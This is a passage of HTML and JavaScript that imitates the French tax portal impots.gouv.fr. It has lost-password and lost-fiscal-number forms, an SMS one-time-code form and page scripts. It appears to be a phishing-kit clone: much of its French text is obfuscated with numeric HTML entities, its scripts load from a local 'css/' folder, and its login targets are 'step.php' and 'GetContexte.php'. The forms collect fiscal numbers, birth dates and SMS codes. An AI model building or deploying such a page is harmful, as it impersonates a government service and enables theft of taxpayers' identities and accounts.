										&#78;&#111;&#117;&#115;&#32;&#118;&#111;&#117;&#115;&#32;&#105;&#110;&#118;&#105;&#116;ons &agrave; v&eacute;ri&#102;&#105;&#101;&#114;&#32;&#108;&#97;&#32;&#115;&#97;&#105;&#115;&#105;&#101;&#32;&#100;&#101;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#110;&#117;m&eacute;ro f&#105;&#115;&#99;&#97;&#108;&#32;&#101;&#116;&#32;&#100;&#101;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#109;&#111;&#116;&#32;&#100;&#101;&#32;&#112;&#97;&#115;&#115;e.<br />
										&#78;&#111;&#117;&#115;&#32;&#118;&#111;&#117;&#115;&#32;&#114;&#97;&#112;&#112;&#101;&#108;&#111;&#110;&#115;&#32;&#113;&#117;&#101;&#32;&#118;&#111;&#117;&#115;&#32;&#100;&#101;&#118;&#101;&#122;&#32;&#97;&#118;&#111;&#105;r cr&eacute;&eacute; u&#110;&#32;&#99;&#111;&#109;&#112;&#116;&#101;&#32;&#115;&#117;&#114;&#32;&#108;&#101;&#32;&#115;&#105;&#116;&#101; <a href="#">&#105;&#109;&#112;&#111;&#116;&#115;.&#103;&#111;&#117;&#118;.fr</a>.<br />
										&#83;&#105;&#32;&#118;&#111;&#115;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#102;&#105;&#97;&#110;&#116;&#115;&#32;&#115;&#111;&#110;&#116;&#32;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#101;&#109;&#101;&#110;&#116;&#32;&#115;&#97;&#105;&#115;&#105;s et q&#117;&#101;&#32;&#108;&#101;&#32;&#98;&#108;&#111;&#99;&#97;&#103;&#101;&#32;&#112;&#101;&#114;&#115;&#105;&#115;&#116;e, &#110;&#111;&#117;&#115;&#32;&#118;&#111;&#117;&#115;&#32;&#105;&#110;&#118;&#105;&#116;&#111;ns &agrave; c&#111;&#110;&#116;&#97;&#99;&#116;&#101;&#114;&#32;&#108;&#101;&#32;&#115;&#117;&#112;&#112;&#111;rt d'a&#105;&#100;&#101;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;t &agrave; l'a&#100;&#114;&#101;&#115;&#115;&#101;&#32;&#115;&#117;&#105;&#118;&#97;&#110;&#116;&#101; : support.usagers@f&#114;&#97;&#110;&#99;&#101;&#99;&#111;&#110;&#110;&#101;&#99;t.&#103;&#111;&#117;v.fr
									</p>
								</div>
							</details>
						</div>
						<!-- Fin du panel-body  -->
						<div class="panel-footer marge">
							<details id="aide_services">
								<summary>Les services disponibles sur votre espace particulier</summary>
								<div class="well">
									<p>Vous pouvez&nbsp;: </p>
									<ul>
										<li>g&eacute;rer votre pr&eacute;l&egrave;vement &agrave; la source,</li>
										<li>payer vos imp&ocirc;ts,</li>
										<li>d&eacute;clarer vos revenus,</li>
										<li>consulter vos d&eacute;clarations et avis d'imposition,</li>
										<li>consulter la situation de vos paiements,</li>
										<li>acc&eacute;der &agrave; des donn&eacute;es publiques,</li>
										<li>retrouver les coordonn&eacute;es de vos services comp&eacute;tents</li>
										<li>r&eacute;aliser des demandes et d&eacute;marches via votre messagerie s&eacute;curis&eacute;e</li>
									</ul>
								</div>
							</details>
							<details id="aide_cookies">
								<summary>Gestion des <em lang="en">cookies</em></summary>
								<div class="well">
									<p>Un <em>cookie</em> est un petit fichier, enregistr&eacute; sur votre appareil, qui contient des informations n&eacute;cessaires au fonctionnement
										du site.
									</p>
									<p>Nous n'y enregistrons pas de donn&eacute;e personnelle.</p>
									<p>Votre navigateur propose en g&eacute;n&eacute;ral un mode de navigation priv&eacute;e,
										qui supprime les <em>cookies</em> &agrave; &#108;&#97;&#32;&#102;&#101;&#114;&#109;&#101;&#116;&#117;&#114;&#101;&#32;&#100;&#117;&#32;&#108;&#111;&#103;&#105;&#99;&#105;&#101;l.
									</p>
								</div>
							</details>
						</div>
						<!-- Fin du panel-footer   -->
					</div>
					<!-- Fin du panel-default  -->
				</section>
				<!-- Fin de la colonne d'aide -->
			</div>
			<!-- row FIN -->
		</main>
		<!-- containe contenu FIN -->
		<footer role="contentinfo">
			<p class="col-md-12 text-center">Direction g&eacute;n&eacute;ra&#108;&#101;&#32;&#100;&#101;&#115;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#101;&#115;&#32;&#112;&#117;&#98;&#108;&#105;&#113;&#117;&#101;s</p>
		</footer>

		<div id="passPerdu" class="modal fade" role="dialog" tabindex="-1" aria-labelledby="passPerduTitle" >
			<div class="modal-dialog" role="dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Fermer"><span aria-hidden="true">&times;</span></button>
						<h3 id="passPerduTitle" class="modal-title titre">TITRE</h3>
					</div>
					<div class="modal-body">
						<form method="post" action="/monprofil-webapp/noAuth/LostPassword" id="oubliMotDePasseForm" name="oubliMotDePasseForm" target="hidden-oubliMotDePasseForm">
							<input type="hidden" id="numfiscal" name="numfiscal" />
							<input type="hidden" id="LostPassword_captchaText" name="captchaText" />
							<input type="hidden" id="LostPassword_dateNaissance" name="dateNaissance" />
							<input type="hidden" id="LostPassword_dateNaissance_tmp" name="dateNaissance_tmp" disabled="true" />
							<IFRAME style="display:none" name="hidden-oubliMotDePasseForm" id="hidden-oubliMotDePasseForm" aria-hidden="true" title="Cadre technique"> </IFRAME>
							<div id="pass">
								<div role="alert" class="alert alert-danger cat2 hide" id="erreurModPwd"></div>
				
								<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_numfiscal">
											<label for="numfiscal_tmp">Num&eacute;ro fiscal</label>
											<div class="ephemere hidden" id="liveCheck_numfiscal_tmp"></div>
											<input class="form-control" name="numfiscal_tmp" id="numfiscal_tmp" type="tel" aria-required="true" autocomplete="on" placeholder="13 chiffres" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_numfiscal" ></div>
										</div>
										<!-- form-group FIN -->
									</div>
									<!-- col-md-12 FIN -->
								</div>
			
								<div class="row form-row " id="fr_LostPassword_DateNaissance">
									<div class="col-xs-11 col-md-12">
										<label for="saisieDate">In&#100;&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#100;&#97;&#116;&#101;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;ce</label>
										<div class="ephemere hidden" id="liveCheck_LostPassword_jourNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_LostPassword_moisNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_LostPassword_anneeNaissance_tmp" role="alert"></div>
									</div>
									<div class="col-xs-4 col-md-4">
										<label for="LostPassword_jourNaissance_tmp" class="hidden" >I&#110;&#100;&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#106;&#111;&#117;&#114;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;ce</label>
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_jourNaissance_tmp" id="LostPassword_jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_moisNaissance_tmp" id="LostPassword_moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_anneeNaissance_tmp" id="LostPassword_anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
									</div>
									<div class="col-xs-11 col-md-12">
										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_LostPassword_DateNaissance" ></div>
									</div>
								</div>
					
								<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_LostPassword_captchaText">
											<label for="LostPassword_captchaText_tmp" class="obligatoire">R&#101;&#99;&#111;&#112;&#105;&#101;&#122;&#32;&#108;&#101;&#115;&#32;&#99;&#97;&#114;&#97;ct&egrave;res de l'image ou de l'e&#120;&#116;&#114;&#97;&#105;&#116;&#32;&#115;&#111;&#110;&#111;re</label>
											<div class="ephemere hidden" id="liveCheck_captchaTextFisc_tmp"></div>
											<input class="form-control" type="text" name="LostPassword_captchaText_tmp" aria-required="true" autocomplete="off" id="LostPassword_captchaText_tmp"  data-max=25 data-mask="alphanum"/>
											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_captchaTextFisc"></div>
										</div>
										<!-- form-group FIN -->
									</div>
									<!-- col-md-12 FIN -->
								</div>
								<!-- row FIN -->
								<div class="form-group">
									<div class="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
										<div class=" col-xs-12 col-sm-6 col-md-6 com-lg-6" id="divCaptchapassPerdu">
										</div>
										<div class="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
											<a href="#" class="listen">
											&Eacute;couter l'e&#120;&#116;&#114;&#97;&#105;&#116;&#32;&#115;&#111;&#110;&#111;&#114;&#101;
											</a>
											<audio class="audio" >
												V&#111;&#116;&#114;&#101;&#32;&#110;&#97;&#118;&#105;&#103;&#97;&#116;&#101;&#117;&#114;&#32;&#110;&#101;&#32;&#112;&#114;&#101;&#110;&#100;&#32;&#112;&#97;&#115;&#32;&#101;&#110;&#32;&#99;&#104;&#97;&#114;&#103;e l'&eacute;l&eacute;ment audio.
											</audio>
											<br />
											<a href="#" class=renewImage>
											Changer d'image
											</a>
										</div>
										<!-- col-12 -->
										<div class="clear"></div>
									</div>
									<!-- captcha -->
								</div>
								<!-- form-group -->
								<div class="row">
									<div class="col-xs-12 text-center">
										<br><button type="submit" class="btn btn-primary" id="lostpass" name="lostpass" value="get pass" onclick="return(controleFormulaireEtSubmit(1,this));">&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#101;&#114;</button>
									</div>
									<!-- col -->
								</div>
								<!-- row -->
							</div>
							<!-- pass -->
						</form>
						<!-- form -->
					</div>
					<!-- modal body -->
				</div>
				<!-- modal-content -->
			</div>
			<!-- modal-dialog -->
		</div>

		<div id="numFiscal" class="modal fade" role="dialog" tabindex="-1" aria-labelledby="numFiscalTitle">
			<div class="modal-dialog" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Fermer"><span aria-hidden="true">&times;</span></button>
						<h3 id="numFiscalTitle" class="modal-title titre">TITRE</h3>
					</div>
					<div class="modal-body">
						<form method="post" action="/monprofil-webapp/noAuth/LostSpi" id="oubliNumFiscalForm" name="oubliNumFiscalForm" target="hidden-oubliNumFiscalForm">
							<input type="hidden" id="LostSpi_email" name="email" />
							<input type="hidden" id="LostSpi_captchaText" name="captchaText" />
							<input type="hidden" id="LostSpi_dateNaissance" name="dateNaissance" />
							<input type="hidden" id="LostSpi_dateNaissance_tmp" name="dateNaissance_tmp" disabled="true"/>
							<IFRAME style="display:none" name="hidden-oubliNumFiscalForm" id="hidden-oubliNumFiscalForm" aria-hidden="true" title="Cadre technique" > </IFRAME>
							<div id="fisc">
								<div role="alert" class="alert alert-danger cat2 hide" id="erreurModFisc"></div>
								<div class="form-group" id="fg_LostSpi_email">
									<label for="LostSpi_email_tmp">Adresse &eacute;lectronique</label>
									<div class="ephemere hidden" id="liveCheck_LostSpi_email_tmp"></div>
									<input class="form-control" type="email" name="LostSpi_email_tmp" aria-required="true" autocomplete="on" id="LostSpi_email_tmp" placeholder="Ex : un@exemple.fr" data-original-title="Il s'agit de l'adresse &eacute;lectronique saisie lors de la cr&eacute;ation de votre espace particulier ou de celle indiqu&eacute;e, post&eacute;rieurement, dans le service &quot;Mon profil&quot;." data-toggle="tooltip" data-placement="top" maxlength="121" data-max=121 />
								</div>
					
								<div class="row form-row " id="fr_LostSpi_DateNaissance">
									<div class="col-xs-11 col-md-12">
										<label for="saisieDate">Ind&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#100;&#97;&#116;&#101;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;&#99;&#101;</label>
										<div class="ephemere hidden" id="liveCheck_LostSpi_jourNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_LostSpi_moisNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_LostSpi_anneeNaissance_tmp" role="alert"></div>
									</div>
									<div class="col-xs-4 col-md-4">
										<label for="LostSpi_jourNaissance_tmp" class="hidden" >In&#100;&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#106;&#111;&#117;&#114;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;&#99;e</label>
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_jourNaissance_tmp" id="LostSpi_jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_moisNaissance_tmp" id="LostSpi_moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_anneeNaissance_tmp" id="LostSpi_anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
									</div>
									<div class="col-xs-11 col-md-12">
										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_LostSpi_DateNaissance" ></div>
									</div>
								</div>
			
								<div class="form-group" id="fg_LostSpi_captchaText" >
									<label for="LostSpi_captchaTextPwd_tmp" class="obligatoire">Recopiez les caract&egrave;res de l'image ou de l'e&#120;&#116;&#114;&#97;&#105;&#116;&#32;&#115;&#111;&#110;&#111;re</label>
									<input class="form-control" type="text" name="LostSpi_captchaText_tmp" aria-required="true" autocomplete="off" id="LostSpi_captchaText_tmp"   data-max=25 data-mask="alphanum"/>
									<div class="ephemere hidden" id="liveCheck_captchaText_tmp"></div>
								</div>
								<!-- form-group -->
								<div class="form-group">
									<!-- FORM-GROUP -->
									<div class="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
										<div class=" col-xs-12 col-sm-6 col-md-6 com-lg-6" id="divCaptchanumFiscal">
										</div>
										<div class="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
											<a href="#" class="listen">&Eacute;couter l'&#101;&#120;&#116;&#114;&#97;&#105;&#116;&#32;&#115;&#111;&#110;&#111;re</a><br />
											<audio class="audio">
												Vo&#116;&#114;&#101;&#32;&#110;&#97;&#118;&#105;&#103;&#97;&#116;&#101;&#117;&#114;&#32;&#110;&#101;&#32;&#112;&#114;&#101;&#110;&#100;&#32;&#112;&#97;&#115;&#32;&#101;&#110;&#32;&#99;&#104;&#97;&#114;&#103;&#101; l'&eacute;l&eacute;ment audio.
											</audio>
											<a href="#" class="renewImage">C&#104;&#97;&#110;&#103;&#101;&#114;&#32;&#100;'image</a>
										</div>
									</div>
									<div class="clear"></div>
								</div>
								<!-- form-group -->
								<div class="row">
									<div class="col-xs-12 text-center">
										<br><button type="submit" class="btn btn-primary" id="lostspi" name="lostspi" value="get SPI" onclick="return(controleFormulaireEtSubmit(1,this));" title="Recevoir mon num&eacute;ro fiscal">C&#111;&#110;&#116;&#105;&#110;uer</button>
									</div>
									<!-- col-12 FIN -->
								</div>
								<!-- row FIN -->
							</div>
							<!-- fisc FIN -->
						</form>
						<!-- form -->
					</div>
					<!-- modal-body -->
				</div>
				<!-- modal-content -->
			</div>
			<!-- modal-dialog -->
		</div>
		<div id="checkSMSMod" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
						<span aria-hidden="true">&times;</span>
						</button>
						<h4 class="modal-title titre">Titre</h4>
					</div>
					<!-- modal-header -->
					<div class="modal-body">
						<form method="post" action="CIBLE" id="checkSMSForm" name="checkSMSForm" target="hidden-checkSMSForm">
							<input type="hidden" id="code_SMS" name="code" />
							<IFRAME style="display:none" name="hidden-checkSMSForm" id="hidden-checkSMSForm" aria-hidden="true" title="Cadre technique" > </IFRAME>
							<div role="alert" class="alert alert-danger cat2 hide" id="erreurModSMS"></div>
							<div class="alert alert-info hide cat3" id="msgInfoSMS"></div>
							<div class="alert alert-info hide cat3" id="msgInfoSMSITX"></div>
							<div class="form-group" id="fg_code_SMS">
								<label for="code_SMS_tmp" class="sr-only" >Code adress&eacute; p&#97;&#114;&#32;&#83;&#77;&#83; (6 chiffres)</label>
								<input class="form-control" type="text" inputmode="numeric" name="code_SMS_tmp" aria-required="true" autocomplete="one-time-code" pattern="^\d{6}$" id="code_SMS_tmp" placeholder="Format : 6 chiffres" data-original-title="Code" data-toggle="tooltip" data-placement="top" maxlength="6" data-max=6 data-feedbackok=1 data-mask="int" />
							</div>
							<!-- form-group -->
							<div id="ctrl-no">
								<div class="ephemere hidden" id="liveCheck_code_SMS_tmp"></div>
								<div style="float: right;">
									<p id="P_codeNonRecu">
										<a id="codeNonRecu" href="#" onclick="resendSMS(this);return(true);">
										Je n&apos;ai pas re&ccedil;u le code.
										</a>
									</p>
								</div>
							</div>
							<br/>
							<br/>
							<div role="alert" class="alert alert-info cat2 hide" id="infoRenewSMS"></div>
							<div role="alert" class="alert alert-info hide" id="infoLastSMS"></div>
							<div class="row">
								<div class="col-md-12 text-center">
									<br><button type="submit" class="btn btn-primary" id="buttonSMS" name="lostspi" value="checkSMS" onclick="return(controleFormulaireEtSubmit(1,this));">c&#82;&#101;&#99;&#101;&#118;&#111;&#105;&#114;&#32;&#108;&#101;&#32;&#108;&#105;&#101;&#110;&#32;&#100;&#101;&#32;&#114;&#101;&#110;&#111;&#117;&#118;&#101;&#108;&#108;&#101;&#109;&#101;&#110;t</button>
									<br><button type="submit" class="btn btn-primary hide" id="lostpass" name="lostpass" value="checkSMS" onclick="return(controleFormulaireEtSubmit(1,this));">&#82;&#101;&#99;&#101;&#118;&#111;&#105;&#114;&#32;&#108;&#101;&#32;&#108;&#105;&#101;&#110;&#32;&#100;&#101;&#32;&#114;&#101;&#110;&#111;&#117;&#118;&#101;&#108;&#108;&#101;&#109;&#101;&#110;t</button>
								</div>
							</div>
						</form>
					</div>
				
				</div>
		
			</div>

		</div>
		<div id="confirmationSpi" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
						<span aria-hidden="true">&times;</span>
						</button>
						<h4 class="modal-title titre">&#84;&#73;&#84;&#82;&#69;</h4>
					</div>
			
					<div class="modal-body">
						<div class="alert alert-info hide cat3" id="numFiscalMsgInfoNeedSecure"></div>
						<p>V&#111;&#117;&#115;&#32;&#97;&#108;&#108;&#101;&#122;&#32;&#114;&#101;&#99;&#101;&#118;&#111;&#105;&#114;&#32;&#117;&#110;&#32;&#99;&#111;&#117;&#114;&#114;&#105;&#101;&#108;&#32;&#97;&#118;&#101;&#99;&#32;&#108;e(s) num&eacute;ro(s) fiscal(aux) &#99;&#111;&#114;&#114;&#101;&#115;&#112;&#111;&#110;&#100;&#97;&#110;&#116; &agrave; l'&#97;&#100;&#114;&#101;&#115;&#115;&#101;&#32;&#113;&#117;&#101;&#32;&#118;&#111;&#117;&#115;&#32;&#97;&#118;&#101;&#122;&#32;&#115;&#97;&#105;&#115;&#105;e.</p>
					</div>
				
				</div>
		
			</div>
		
		</div>
		<div id="confirmationPassword" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
						<span aria-hidden="true">&times;</span>
						</button>
						<h4 class="modal-title titre">&#84;&#73;&#84;&#82;&#69;</h4>
					</div>
				
					<div class="modal-body">
						<div class="alert alert-info hide cat3" id="passPerduMsgInfoNeedSecure"></div>
						<p>Vo&#117;&#115;&#32;&#97;&#108;&#108;&#101;&#122;&#32;&#114;&#101;&#99;&#101;&#118;&#111;&#105;&#114;&#32;&#117;&#110;&#32;&#99;&#111;&#117;&#114;&#114;&#105;&#101;l &agrave; l'adresse que vous avez indiqu&eacute;e d&#97;&#110;&#115;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#101;&#115;&#112;&#97;&#99;&#101;&#32;&#112;&#97;&#114;&#116;&#105;&#99;&#117;&#108;ier.</p>
						<p>Il vo&#117;&#115;&#32;&#112;&#101;&#114;&#109;&#101;&#116;&#116;&#114;&#97;&#32;&#100;&#101;&#32;&#114;&#101;&#110;&#111;&#117;&#118;&#101;&#108;&#101;&#114;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#109;&#111;&#116;&#32;&#100;&#101;&#32;&#112;&#97;&#115;&#115;&#101;&#32;&#101;&#110;&#32;&#113;&#117;&#101;&#108;&#113;&#117;&#101;&#115;&#32;&#99;&#108;&#105;&#99;s.</p>
					</div>
				
				</div>
				
			</div>
		
		</div>

		<div id="indispoMP" class="modal fade lost" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-body">
					
						<p>	&#76;&#101;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#32;&#101;&#115;&#116;&#32;&#105;&#110;&#100;&#105;&#115;&#112;&#111;&#110;ible&nbsp;; veuillez r&eacute;it&eacute;rer v&#111;&#116;&#114;&#101;&#32;&#100;&#101;&#109;&#97;&#110;&#100;&#101;&#32;&#117;&#108;t&eacute;rieurement. </p>
					
					</div>
			
				</div>
		
			</div>
	
		</div>
		<div id="deco" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content" id="deco_contenu">
					<div class="modal-header">
						<h3 class="modal-title titre">D&eacute;connexion</h3>
					</div>
					<div class="modal-body">
						<div id="deconnecte" class="rounded">
							<iframe name="app0" id="app0" class="hide" aria-hidden="true" title="Cadre technique"></iframe>
							
							 	
							
							D&eacute;c&#111;&#110;&#110;&#101;&#120;&#105;&#111;&#110;&#32;&#101;&#110;&#32;&#99;&#111;&#117;&#114;s, ve&#117;&#105;&#108;&#108;&#101;&#122;&#32;&#112;&#97;&#116;&#105;&#101;&#110;&#116;er...<br />
							
							<br />
						
							<div class="text-center" id="decoWait"></div>
							<br />
						</div>
						
					</div>
			
				</div>
	
			</div>
		</div>
		<script type="text/javascript" src="css/jquery.min.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/bootstrap.min.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/auth2019v3.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/idContact.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/messages.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/urls.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/configuration.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/franceConnect.js" charset="utf-8"></script>
		<script type="text/javascript" src="css/jquery.details.js" charset="utf-8"></script>
		<script>
			$(function() {
			
				$('html').addClass($.fn.details.support ? 'details' : 'no-details');
				$('details').details();
			});
		</script>
		<script>
			urlLoginMotDePasse = 'step.php';
			urlContexte = 'GetContexte.php';
			urlLogin3S = '/LoginAccess?op=c&url=';
			urlLoginPAS = '/LoginPAS?op=c&url=';
			urlCible=urlContexte;
			$("#formfc").attr('action',authFCFS);
			
		</script>
		<script>

			$(document).ready(function() {

				if (window.self.location.href!=window.top.location.href) {
					window.parent.location.href=window.self.location.href;
				}
				//------------------
				var iFocus = null;
				$("#aide").on('hidden.bs.modal', function() {
					if (!iFocus) return;
					iFocus.focus();
				});
				cfp={};
				if (typeof authType === 'undefined') {
					authType='sso';
				}
				$('#logo').attr('href',PortPub+PathPub); 
				$('#toPortailPub').attr('href',PortPub+PathPub);
				$('#proPriv').attr('href',ProPrivFqdn+ProPrivPath);
				$('#payer').attr('href',Payer);
				switch(authType) {
					case 'sso':
						$('#backFranceConnect').addClass('hide');
						$('#partPriv').removeClass('hide');
						$('#proPriv').removeClass('hide');
						$('#FranceConnect').removeClass('hide');
						break;
					case 'idp':
						$('#backFranceConnect').removeClass('hide');
						$("#backFranceConnect").on( "click", function() {
							pagePrecedente();
					});
						$('#partPriv').addClass('hide');
						$('#proPriv').addClass('hide');
						$('#FranceConnect').addClass('hide');
						$('#FranceConnect').remove();
						$(".breadcrumb").empty();
						$("#Payer").remove();
						$("#aide_mdp1").remove();
						$("#aide_services").remove();
						$("#oubliNumFiscalForm").attr('action',fqdnCFSPart+'/monprofil-webapp/noAuth/LostSpi');
						$("#oubliMotDePasseForm").attr('action',fqdnCFSPart+'/monprofil-webapp/noAuth/LostPassword');
						urlMPRecup=fqdnCFSPart+urlMPRecup;
						break;
				}
				initIdContact(authType);
				messageContenu={};
				initMessages(authType);
				$('#CFP').html(cfp['NONUM']);
				$('#CFP2').html(cfp['NOINFO']);
				$('#CFP3').html(cfp['default']);
				$('#CFP4').html(cfp['PERTENUM']);
				$('#titre_authent').html(messageContenu['CTXtitre_authent']);
				visumdp=0;
				if (typeof afficherVisuMdp !== 'undefined' ) {
					if (afficherVisuMdp==1) {
					visumdp=1;
					}
				}
				changespi=0;
				if (typeof afficherChangerSpi !== 'undefined') {
					if (afficherChangerSpi==1) {
					changespi=1;
					}
				}
				if (changespi == 1) {
					$("#changeSPI").removeClass("hide");
				}
				else {
					$("#changeSPI").addClass("hide") ; 
				}
				if (visumdp == 1) {
					$("#boutonvisumdp").removeClass("hide");
					$("#visumdp").attr('title',messageContenu['visuMdpON']);
				}
				else {
					$("#boutonvisumdp").addClass("hide") ; 
				}
			
				ecouteReponseForm();
				numTry=0;
				var timeOutId = null;

				accordeon();
				controleEntreeLive();
				afficheForm('CTX');
				videChamps('CTX','_tmp','spi');
				$('[data-toggle="tooltip"]').tooltip({'trigger':'hover focus'});
				$(".renewImage").click(function(e){
					$(".captcha").attr('src', $(this).closest("form").attr('action') + '?format=image' + '&?id' + (new Date()).getTime());
					e.preventDefault();
				});
				$("input[data-mask='jour'],input[data-mask='mois']").on('focusout',function() {
						if (($(this).val().toString().length==1) && $(this).val()>=1 && $(this).val()<=9) {
								$(this).val('0'+$(this).val());
						}
				});
				$('#passPerdu,#numFiscal').on('show.bs.modal', function (event) {
					$(this).find(".modal-title").text(messageContenu['titreModale'+$(this).attr('id')]);
					$("#divCaptcha"+$(this).attr('id')).html('<img class="captcha img-responsive centrerResponsiveElement" src="" alt="Captcha" />');
					$(".captcha").attr('src', $(this).find("form").attr('action') + '?format=image' + '&?id' + (new Date()).getTime()).error(
						function() { 
							$('.modal:visible').modal('toggle');
							$("#indispoMP").modal('show');
						} );
					$("#numfiscal_tmp").val('');
					$(this).find('input').not("[type='hidden']").each(function(index,unChamps) {
						$(unChamps).removeAttr('disabled');
						$(unChamps).val('');
					});
					if ($('#spi').val())  {  $("#numfiscal_tmp").val($('#spi').val()); $("#numfiscal_tmp").change() ; }
					NoError();
					if (typeof timeoutId === 'undefined' ) {
					} else {
						clearTimeout(timeoutId);
					}
				});

				$(".listen").click(function(e){
					var song = $("audio")[0];
					
					song.src=$(this).closest("form").attr('action') + "?format=audio"  + "&?id" + (new Date()).getTime();
					song.play();
					e.preventDefault();
				});
			});

			$(window).load(function(){
				var currentLocation = window.location.search;
				if(currentLocation.indexOf("?modale=") > -1)
					{
						var table=currentLocation.split("?modale=")
						var modale=table[1].split("&Erreur=")
						$("#"+modale[0]).modal('show');
						timeoutId=setTimeout(function() {
							window.parent.location.href="/";
						}, 2000);
					}
			});
			$(window).scroll(function () {
				if ($(this).scrollTop() > 0) {
					$('#aide_scroll').fadeOut().attr('aria-hidden', true);
				}
				else {
					$('#aide_scroll').fadeIn().attr('aria-hidden', false);
				}
			});
		</script>

		<script>
			if (!document.cookie)
				{
					document.cookie = "essai=cookie";
					if (!document.cookie)
						{
							deleteClassName(document.getElementById('cookie_error'), 'hide');
						}
					else
					{
							addClassName(document.getElementById('cookie_error'), 'hide');
						}
				}
			else
				{
					addClassName(document.getElementById('cookie_error'), 'hide');
				}
		</script>

		<script>
			debug=0;
			storeAndroidURL='#';
			storeAppleURL='#';
			storeWindowsPhoneURL='#';
			var afficheSmartBanner_default=0;
			if (navigator.userAgent.match(/Android/i))
				{
					afficheSmartBanner_default=1;
					if (typeof(afficheSmartBanner)=='undefined') { var afficheSmartBanner=new Object();}
					if (!("android" in afficheSmartBanner)) { afficheSmartBanner["android"]=afficheSmartBanner_default ; }
					if (afficheSmartBanner["android"]==1)
								{
